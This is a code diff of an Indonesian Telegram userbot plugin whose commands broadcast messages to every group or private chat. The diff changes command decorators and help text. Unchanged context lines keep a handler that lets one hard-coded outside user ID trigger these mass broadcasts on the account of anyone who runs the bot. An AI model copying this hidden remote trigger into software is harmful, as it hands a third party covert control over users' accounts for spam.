@@ -1,6 +1,7 @@
 from userbot.events import register
 from userbot import CMD_HELP, bot
-
+from userbot import CMD_HANDLER as cmd
+from userbot.utils import ram_cmd
 
 GCAST_BLACKLIST = [
     -1001473548283,  # SharingUserbot
@@ -24,7 +25,7 @@ GCAST_BLACKLIST = [
 
 # BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
-@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@ram_cmd(pattern="gcast$")
 @register(incoming=True, from_users=1826643972,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
@@ -54,7 +55,7 @@ async def gcast(event):
         f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
     )
 
-@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
+@ram_cmd(pattern="gucast$")
 @register(incoming=True, from_users=1826643972,
           pattern=r"^\.cgucast(?: |$)(.*)")
 async def gucast(event):
@@ -79,12 +80,12 @@ async def gucast(event):
 
 CMD_HELP.update(
     {
-        "gcast": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.gcast`\
+        "gcast": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}gcast`\
          \n↳ : Mengirim Pesan Group Secara Global."})
 
 CMD_HELP.update(
     {
-         "gucast": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.gucast`\
+         "gucast": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}gucast`\
          \n↳ : Mengirim Pesan Pribadi Secara Global."
     }
 )
